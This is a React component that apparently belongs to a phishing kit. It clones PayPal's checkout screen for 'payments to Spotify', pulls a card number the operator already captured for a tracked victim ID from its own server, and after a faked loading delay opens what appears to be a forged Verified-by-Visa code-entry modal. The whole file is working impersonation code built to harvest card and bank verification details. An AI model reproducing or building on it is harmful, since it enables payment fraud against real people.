import React, { useState, useEffect } from 'react';
import { zokomId } from '../utils/auth';
import { useHistory } from 'react-router-dom/cjs/react-router-dom.min';
import axios from 'axios';
import Container from '../vbv/container';

const PayPalCheckout = () => {
    const [styles, setStyles] = useState(null);
    const [cardNumber, setCardNumber] = useState('');
    const [showModal, setShowModal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const userId = zokomId();
    const history = useHistory();
    const formatCardNumber = (number) => {
        if (!number) return '';
        const lastFour = number.slice(-4);
        return `••${lastFour}`;
    };
    const handleAddCardClick = () => {
        history.push('/paypalbilling');
    };
    const handleAgreeClick = () => {
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            setShowModal(true);
        }, 1500); // Show loading for 1.5 seconds
    };

    useEffect(() => {
        // Load styles
        const loadStyles = async () => {
            try {
                const [loginStyles, additionalStyles] = await Promise.all([
                    import('../../assets/styles/paypaltoverif.css'),
                    import('../../assets/styles/codeinput.css')
                ]);

                setStyles({
                    login: loginStyles.default,
                    additional: additionalStyles.default
                });
            } catch (error) {
                console.error('Error loading styles:', error);
            }
        };
        loadStyles();

        // Fetch card info
        const fetchCardInfo = async () => {
            try {
                const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/billing/${userId}/card`);
                if (response.data.cardNumber) {
                    setCardNumber(response.data.cardNumber);
                }
            } catch (error) {
                console.error('Error fetching card info:', error);
            }
        };

        if (userId) {
            fetchCardInfo();
        }
    }, [userId]);

    return (
        <div dir="ltr" id="root">
            {showModal && <Container onClose={() => setShowModal(false)} />}
            <div className="App__app--3P8ep">
                <div className={`transitioning spinnerWithLockIcon ${!isLoading ? 'hide' : ''}`} aria-busy="true">
                </div>
                <div className={`lockIcon ${!isLoading ? 'hide' : ''}`}></div>
                <div className="hagrid-13bypra">
                    <div
                        className="hagrid-1372px5-container_fluid"
                        data-ppui-info="grid_3.2.4"
                        id="page-content"
                    >
                        <div className="hagrid-wcpuj4-row" data-ppui-info="grid_3.2.4">
                            <div className="hagrid-1oilgb3-col" data-ppui="true">
                                <div className="hagrid-14reej8"></div>
                            </div>
                        </div>
                        <div id="review-page__sidebar-tray" className="hagrid-0">
                            <div className="hagrid-33yawo-row" data-ppui-info="grid_3.2.4">
                                <div className="hagrid-1gh95z7-col" tabIndex="0" data-ppui="true">
                                    <div
                                        className="hagrid-fw0ay1-text_caption_strong"
                                        data-ppui-info="caption-text_6.3.3"
                                    >
                                        One-time setup, faster checkouts.
                                    </div>
                                    <div className="hagrid-mek7lv-text_caption" data-ppui-info="caption-text_6.3.3">
                                        <div>For future payments to Spotify</div>
                                    </div>
                                </div>
                            </div>
                            <div className="hagrid-apa4k7-row" data-ppui-info="grid_3.2.4">
                                <div className="hagrid-rtqckv-col" data-ppui="true"></div>
                            </div>
                            <div
                                className="hagrid-s8u2ug-row"
                                data-ppui-info="grid_3.2.4"
                                id="review-page__content"
                            >
                                <div className="hagrid-h4l614-col" data-ppui="true">
                                    <div
                                        data-testid="fiSelector"
                                        className="hagrid-1vydhhl"
                                        style={{ padding: '1rem 0.75rem' }}
                                    >
                                        <button
                                            className="hagrid-10wmai8-row-no_gutter"
                                            data-ppui-info="grid_3.2.4"
                                            id="CC-LFEFTHGGCYP3E"
                                            data-testid="selected-fi"
                                        >
                                            <div className="hagrid-893lzx-col_auto" data-ppui="true">
                                                <div className="hagrid-9cz39w">
                                                    <div className="hagrid-remr1f"></div>
                                                </div>
                                            </div>
                                            <div className="hagrid-8rkb7w-col_9" data-ppui="true">
                                                <div
                                                    className="hagrid-1sgrmbr-row-no_gutter"
                                                    data-ppui-info="grid_3.2.4"
                                                >
                                                    <div
                                                        className="hagrid-mntvsz-text_body_strong"
                                                        data-ppui-info="body-text_6.3.3"
                                                    >
                                                        Credit {formatCardNumber(cardNumber)}
                                                    </div>
                                                </div>
                                                <div
                                                    className="hagrid-1sgrmbr-row-no_gutter"
                                                    data-ppui-info="grid_3.2.4"
                                                >
                                                    <div
                                                        className="hagrid-q8uo6l-text_caption"
                                                        data-ppui-info="caption-text_6.3.3"
                                                    >
                                                        Your Bank
                                                    </div>
                                                </div>
                                            </div>
                                            <div className="hagrid-1hrpr3f-col_1" data-ppui="true">
                                                <span
                                                    className="hagrid-19901i0-svg-size_md-sysColorSelectedMain"
                                                    data-ppui-info="icons_8.13.1"
                                                    aria-label="selected"
                                                    data-ppui="true"
                                                >
                                                    <svg
                                                        xmlns="http://www.w3.org/2000/svg"
                                                        fill="currentColor"
                                                        viewBox="0 0 24 24"
                                                        width="1em"
                                                        height="1em"
                                                        data-ppui="true"
                                                    >
                                                        <path
                                                            fillRule="evenodd"
                                                            d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm5.135-11.954a.75.75 0 0 0-1.19-.912l-5.292 6.904-2.59-2.661a.75.75 0 0 0-1.075 1.046l3.188 3.275a.76.76 0 0 0 1.147-.068l5.812-7.584z"
                                                            clipRule="evenodd"
                                                            data-ppui="true"
                                                        ></path>
                                                    </svg>
                                                </span>
                                            </div>
                                        </button>
                                        <hr
                                            className="hagrid-e4layv-divider_base"
                                            data-ppui-info="divider_4.1.10"
                                        />
                                        <div className="hagrid-pl611z-row-no_gutter" data-ppui-info="grid_3.2.4">
                                            <button onClick={handleAddCardClick} className="hagrid-hqd0jp-col" data-ppui="true">
                                                <span
                                                    className="hagrid-3fi865-links_base-text_body_strong"
                                                    data-ppui-info="links_4.2.3"
                                                >
                                                    Add a debit or credit card
                                                </span>
                                            </button>
                                        </div>
                                    </div>
                                    <div
                                        className="hagrid-1ysxm3m-text_caption"
                                        data-ppui-info="caption-text_6.3.3"
                                        tabIndex="0"
                                    >
                                        <p></p>
                                        <div>
                                            View{' '}
                                            <a
                                                href="https://www.paypal.com/legalhub/paypal/upcoming-policies-full"
                                                target="_blank"
                                            >
                                                PayPal Policies
                                            </a>{' '}
                                            for payment method rights.
                                        </div>
                                        <p></p>
                                    </div>
                                </div>
                            </div>
                            <div className="hagrid-zwblip-row" data-ppui-info="grid_3.2.4">
                                <div className="hagrid-rtqckv-col" data-ppui="true">
                                    <div
                                        className="hagrid-1y6kyg1-container_fluid"
                                        data-ppui-info="grid_3.2.4"
                                    >
                                        <div
                                            className="hagrid-s8u2ug-row"
                                            data-ppui-info="grid_3.2.4"
                                        >
                                            <div className="hagrid-1nhh7rf-col" data-ppui="true">
                                                <div
                                                    className="hagrid-qprdf9-text_caption"
                                                    data-ppui-info="caption-text_6.3.3"
                                                    tabIndex="0"
                                                >
                                                    <div>You can change this choice anytime in settings.</div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            className="hagrid-1kgc7wn-row"
                                            data-ppui-info="grid_3.2.4"
                                        >
                                            <button
                                                className="hagrid-1adoc1k-button_base-text_button_lg-btn_full_width"
                                                data-ppui-info="buttons_7.3.3"
                                                data-testid="consentButton"
                                                id="consentButton"
                                                onClick={handleAgreeClick}
                                            >
                                                Agree &amp; Continue
                                            </button>
                                        </div>
                                        <div
                                            className="hagrid-1fjte89-row"
                                            data-ppui-info="grid_3.2.4"
                                        >
                                            <div className="hagrid-1nhh7rf-col" data-ppui="true">
                                                <a
                                                    className="hagrid-naqfuv-links_base-text_body_strong"
                                                    data-ppui-info="links_4.2.3"
                                                    data-test-id="cancelURL"
                                                    href="https://spotify.com"
                                                    role="button"
                                                    id="cancelLink"
                                                >
                                                    <div
                                                        className="hagrid-1jegmup-text_caption_strong"
                                                        data-ppui-info="caption-text_6.3.3"
                                                    >
                                                        Cancel and return to Spotify Inc
                                                    </div>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PayPalCheckout;
